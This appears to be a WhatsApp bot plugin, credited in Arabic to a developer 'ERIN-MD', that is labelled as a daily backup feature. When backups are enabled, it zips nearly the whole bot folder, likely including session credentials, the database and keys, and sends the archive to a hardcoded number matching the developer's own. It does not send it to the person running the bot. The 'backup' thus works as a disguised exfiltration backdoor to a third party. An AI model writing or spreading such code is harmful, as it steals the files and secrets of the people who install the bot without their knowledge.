/*

╮────────────────────────╭ـ

│ المطور : ERIN-MD

│ رقم المطور : https://wa.me/201222784295

│ حساب المطور : https://atom.bio/erin-md

│ جروب الدعم : https://chat.whatsapp.com/EorEp8p1KAMKDu6WFiM1n8

│ القناه : https://whatsapp.com/channel/0029VaiUhw5BFLgV89U3rT18

╯────────────────────────╰ـ 

*/

import fs from 'fs';

import path from 'path';

import { fileURLToPath } from 'url';

import { dirname } from 'path';

import { exec } from 'child_process';

const __filename = fileURLToPath(import.meta.url);

const __dirname = dirname(__filename);

export async function all(m) {

    let pengaturan = global.db.data.settings[this.user.jid];

    if (!pengaturan.backup) return; // إذا كان النسخ الاحتياطي معطلاً

    if (new Date() * 1 - pengaturan.backupDB > 86400000) { // كل 24 ساعة

        const botFolderPath = path.join(__dirname, '../');

        const zipFilePath = path.join(__dirname, '../bot_backup.zip');

        const ownerNumber = '201222784295@s.whatsapp.net'; // رقم المطور لاستقبال الإشعارات

        // إرسال إشعار قبل النسخ الاحتياطي

        await conn.sendMessage(ownerNumber, { 

            text: `🔔 *إشعار النسخ الاحتياطي*\n📦 سيتم الآن إنشاء نسخة احتياطية من السكربت وإرسالها لك...` 

        });

        await conn.sendMessage(ownerNumber, { 

            text: `🔄 بدء النسخ الاحتياطي...`

        });

        // تنفيذ ضغط الملفات مع استثناء الملفات غير الضرورية

        const zipCommand = `zip -r "${zipFilePath}" . -x "node_modules/*" ".git/*" ".cache/*" "*.zip"`;

        exec(zipCommand, { cwd: botFolderPath }, async (error, stdout, stderr) => {

            if (error) {

                await conn.sendMessage(ownerNumber, { 

                    text: `❌ *خطأ أثناء إنشاء النسخة الاحتياطية:*\n${error.message}` 

                });

                return;

            }

            if (stderr) {

                await conn.sendMessage(ownerNumber, { 

                    text: `⚠️ *تحذير أثناء ضغط الملفات:*\n${stderr}` 

                });

            }

            await conn.sendMessage(ownerNumber, { 

                text: `✅ *تم إنشاء النسخة الاحتياطية بنجاح!*`

            });

            if (!fs.existsSync(zipFilePath)) {

                await conn.sendMessage(ownerNumber, { 

                    text: `❌ *فشل النسخ الاحتياطي:* لم يتم العثور على ملف ZIP.` 

                });

                return;

            }

            // إرسال النسخة الاحتياطية للمطور

            await conn.sendMessage(ownerNumber, {

                document: fs.readFileSync(zipFilePath),

                mimetype: 'application/zip',

                fileName: 'bot_backup.zip',

                caption: `✅ *تم إنشاء النسخة الاحتياطية بنجاح!*`

            });

            // حذف ملف النسخة الاحتياطية بعد الإرسال

            fs.unlink(zipFilePath, async (err) => {

                if (err) {

                    await conn.sendMessage(ownerNumber, { 

                        text: `❌ *خطأ أثناء حذف ملف النسخ الاحتياطي:*\n${err.message}` 

                    });

                    return;

                }

                await conn.sendMessage(ownerNumber, { 

                    text: `🗑️ *تم حذف ملف النسخة الاحتياطية بعد الإرسال.*` 

                });

            });

            // تحديث توقيت آخر عملية نسخ احتياطي

            pengaturan.backupDB = new Date() * 1;

        });

    }

}